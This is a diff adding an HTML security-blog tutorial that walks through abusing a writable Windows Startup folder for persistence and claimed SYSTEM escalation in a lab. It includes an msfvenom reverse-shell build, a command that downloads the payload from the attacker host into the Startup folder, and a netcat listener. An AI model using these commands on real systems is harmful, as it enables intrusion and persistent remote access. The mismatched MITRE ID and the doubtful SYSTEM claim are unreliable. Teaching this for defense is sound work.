@@ -1,0 +1,94 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
+            <h1 class="post-title entry-title">Windows Privilege Escalation: Boot Logon Autostart Execution (Startup Folder)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-privilege-escalation-boot-logon-autostart-execution-startup-folder/" rel="bookmark"><time class="entry-date published" datetime="2021-10-26T17:13:45+00:00">October 26, 2021</time><time class="updated" datetime="2025-07-29T06:08:37+00:00">July 29, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">The <strong data-start="587" data-end="613">Windows Startup folder</strong> may be targeted by an attacker to escalate privileges or perform <strong data-start="679" data-end="702">persistence attacks</strong>. By adding an application to a <strong data-start="734" data-end="752">startup folder</strong> or referencing it with a <strong data-start="778" data-end="798">Registry run key</strong>, the application will execute upon user sign-in. This technique, known as <strong data-start="873" data-end="923">Boot Logon Autostart Execution: Startup Folder</strong>, can allow the program to run with the same privileges as the logged-in user.</span></p>
+<p><span style="color: #000000;">There are two techniques to perform Logon Autostart Execution :</span></p>
+<ul>
+<li><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/windows-privilege-escalation-logon-autostart-execution-registry-run-keys/"><strong>Logon Autostart Execution: Registry Run Keys</strong></a></span></li>
+<li><span style="color: #000000;"><strong>Logon Autostart Execution: Startup Folder</strong></span></li>
+</ul>
+<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
+<p><span style="color: #000000;"><strong>Windows Startup Folder </strong></span></p>
+<p><span style="color: #000000;"><strong>Boot | Logon Autostart Execution (Mitre Attack) </strong></span></p>
+<p><span style="color: #000000;"><strong>Prerequisite</strong></span></p>
+<p><span style="color: #000000;"><strong>Lab Setup</strong></span></p>
+<p><span style="color: #000000;"><strong>Privilege Escalation by Abusing Startup Folder </strong></span></p>
+<ul>
+<li><span style="color: #000000;">Enumerating Assign Permissions using Icacls</span></li>
+<li><span style="color: #000000;">Enumerating Assign Permissions using Accesschk.exe</span></li>
+<li><span style="color: #000000;">Creating Malicious Executable</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Windows Startup Folder </strong></span></p>
+<p><span style="color: #000000;">The Startup folder was a folder accessible from the Start Menu. Programs saved in this folder would start up immediately once users turned on their machine. There are two locations for the startup folder in windows.</span></p>
+<ul>
+<li><span style="color: #000000;">Startup folder that functions at the system level and is accessible by all user accounts.</span></li>
+</ul>
+<p><span style="color: #000000;">The All Users Startup folder is found in the following path:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</strong></span></li>
+<li><span style="color: #000000;">Run dialog box: Windows Key + R), type <strong>shell:common startup</strong></span></li>
+</ul>
+<ul>
+<li><span style="color: #000000;">Each user on the system has their own startup folder that executes at the user level.</span></li>
+</ul>
+<p><span style="color: #000000;">The Current User Startup folder is located here:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>C:\Users\&lt;User_Name&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</strong></span></li>
+<li><span style="color: #000000;">Run dialog box: Windows Key + R), type <strong>shell: startup</strong></span></li>
+</ul>
+<h3><span style="color: #000000;"><strong><span style="color: #800000;">Boot | Logon Autostart Execution: Startup Folder</span> </strong></span></h3>
+<p><span style="color: #000000;">Injecting a malicious program within a startup folder will also cause that program to execute when a user logs in, thus it may help an attacker to perform persistence or privilege escalation Attacks from misconfigured startup folder locations.</span></p>
+<p><span style="color: #000000;">This technique is the most driven method for persistence used by well know APTs such as APT3, APT33,  APT39 and etc.</span></p>
+<p><span style="color: #000000;"><strong>Mitre ID:</strong> T1574.001</span></p>
+<p><span style="color: #000000;"><strong>Tactics:</strong> Privilege Escalation &amp; Persistence</span></p>
+<p><span style="color: #000000;"><strong>Platforms:</strong> Windows</span></p>
+<p><span style="color: #000000;"><strong>Prerequisite</strong></span></p>
+<p><span style="color: #000000;"><strong>Target Machine:</strong> Windows 10</span></p>
+<p><span style="color: #000000;"><strong>Attacker Machine:</strong> Kali Linux</span></p>
+<p><span style="color: #000000;"><strong>Tools: </strong><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk.exe</a></strong></span></span></p>
+<p><span style="color: #000000;"><strong>Condition:</strong> Compromise the target machine with low privilege access either using Metasploit or Netcat, etc.</span></p>
+<p><span style="color: #000000;"><strong>Objective:</strong> Escalate the NT Authority /SYSTEM privileges for a low privileged user by exploiting the Misconfigured Startup folder.</span></p>
+<p><span style="color: #000000;"><strong>Lab Setup</strong></span></p>
+<p><span style="color: #000000;">Note: Given steups will create a loophole through misconfigured startup folder, thus avoiding such configuration in a production environment.</span></p>
+<p><span style="color: #000000;">Step 1: Navigate to the Startup directory using the following path:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjlUFKGj30AObqDsFMJu_eHSIBwiY-7U8WSWkqNPSzXkpbkGmHqFdeXJiTUA4hzD_iHilE1xlwciQFPL-nR9UZ02ZZgsRDWKdCGMw_HppvezIicQDWVwTHYBerUAh7vHMZJBC48BaEvrmxTg7ylAWoXOQoQ130-PGZOvUfZP2OfUf_iIDnM-EZ8cA_H-A=s16000"/></span></p>
+<p><span style="color: #000000;">Step2: Access the startup folder properties and select the security option. Click on the Edit option to assign dangerous permissions to the Users group.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiReaiVVxEB19v0Jog0Rr4iFBXj1OH1_5k0elBLas5Iw0sQmwM7aTrZ8F36lCvMCvBLOscA56g6OPW6qyLyIfME-44DY1NY5r9p09aAeOFfX4yVQ7RlQglF3isJCT5fKrFZUztjVysqH6F8enqDIVApYPx1La-_daAuddIrmvKVt66AZe4eNN5oeJkBqg=s16000"/></span></p>
+<p><span style="color: #000000;">Step 3: Select Users group on the targeted system and assign Read Write or FULL Control permissions.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhVBgl8jF6E1slRq4OLSf5HD_v6Lue0J9vqLXoVutrMllAZIgYD9JP8XWGovlRRqfB-DqWi3UIdB70y-KyfvYnzzblo7OOsPeurD8XwRONiPSJAY77fUqkLUgst039rwEprHOG6qPUcWzVefNpReNoY-j7rnx54aeruu68g3F1-0Hn8mnl-dGT-F8xxhA=s16000"/></span></p>
+<h3><span style="color: #000000;"><strong><span style="color: #800000;">Privilege Escalation by Abusing Startup Folder</span> </strong></span></h3>
+<p><span style="color: #000000;"><strong>Enumerating Assign Permissions with Icacls </strong></span></p>
+<p><span style="color: #000000;">Attackers can exploit these configuration locations to launch malware, such as RAT, in order to sustain persistence during system reboots.</span></p>
+<p><span style="color: #000000;">Following an initial foothold, we can identify permissions using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhsdqMottEbnNCxOCERS9nSPVxf73380zubKX9qWyvbVnxoon6-0bR2gTVwwMPH1PtHoSSRk56OalBDhoKkm9RLRR21S15S-ulHrczBde7JDUjyD5yxJ9tTe6I7g5YXAiccU9hhnz12JbiKKGLyr3zeOG67fl2_AfzWW3yb8_wjvUbA-zdn2D4w5uYVAA=s16000"/></span></p>
+<h3><span style="color: #800000;"><strong>Enumerating Assign Permissions using Accesschk.exe</strong></span></h3>
+<p><span style="color: #000000;">The accesschk.exe is Sysinternals tool another permission checker tool.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">accesschk.exe /accepteula "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"</pre>
+<p><span style="color: #000000;">Here Read-write permission is assigned on BUILTIN\Users</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhJu70BLKu2BhMyfe0RVW5Hu6VRCneyTs8k0GBOzd_X7agcwpjl42e-u58MWlfr-K_fx9ngB3NWp9saFJAkHs3KZSnYP1YccppXm1vOb4o6XE00iHe0mf_5d086S-Bl_oTdYewRPHTGTi0Bv0iRhLQXIvBDeSvMod0iEikxFj4AY4F2BW6o4U_Kk-vnNw=s16000"/></span></p>
+<h3><span style="color: #800000;"><strong>Creating Malicious Executable</strong></span></h3>
+<p><span style="color: #000000;">As we know the current user owns read-write permission for the startup folder thus we can inject RAT to perform persistence or privilege escalation. Let’s create an executable program with the help of msfvenom.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom –p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 –f exe &gt; shell.exe
+python –m SimpleHTTPServer 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgU6NG0H3wB3TgiUEX1MoC27W0kvo7FLyPeIhN4weVfJ9WE4IrPoYnu7gcraBAahBX3yl4MOT74QpB3kMhS5bw-Dx44U-xJscw67yHXR0HMbcItxIFCejx11pTWq9EnVqAc8jsv3LH5PzMUyBtSDXKd2EbxGH0JvqP4P65rB3K6OhsL7VcDKSCngm-b1Q=s16000"/></span></p>
+<h3><span style="color: #000000;"><strong><span style="color: #800000;">Executing Malicious Executable</span> </strong></span></h3>
+<p><span style="color: #000000;">Start a netcat listener in a new terminal and transfer the shell.exe with the help of the following command</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+powershell wget 192.168.1.3/shell.exe -o shell.exe
+dir</pre>
+<p><span style="color: #000000;">As we know this attack is named as Boot Logon Autostart Execution which means the shell.exe file operates when the system will reboot.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhCNFo_Nv0jPmUvD6pawXf7p9nfIb3Fd56dJKbmmo8UUuqJPX9hI-Ei9ooZHIDoWBQGhro4jvsROqwwvVq-2Ms6MnJRBrwqr9XjyQeEtBgZ0qqxpZam2kMKvy5I7vPAWup7encvJq1gVSJuLk--g-xgzdBdXAL8_p86ANBBvzIlObbgWBsl-5rNaD1TgA=s16000"/></span></p>
+<p><span style="color: #000000;">Finally with this the attacker will get a reverse connection in the new netcat session as NT Authority \System</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhVYFFhOJPD2EzgUqfFmfU5lJipDtv8qSTVAPQnwvT4b9ApNOXS4j2UEr8XjIBgTp7Cz1bq9v4KpP3UCtDLx37ZsBqCl59dP4sdXDxSfWWZbbOGwmfF4URrG2nfroM29DgvQr8__Dp2dqBshgtEerJMmYsNPBp-rmZhUrJecxRnvnwtPpdDVC-6bQVIFg=s16000"/></span></p>
+<p><span style="color: #000000;"><strong>Reference</strong>: <span style="color: #0000ff;">https://attack.mitre.org/techniques/T1547/001/</span></span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> <span style="color: #0000ff;">here</span></a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
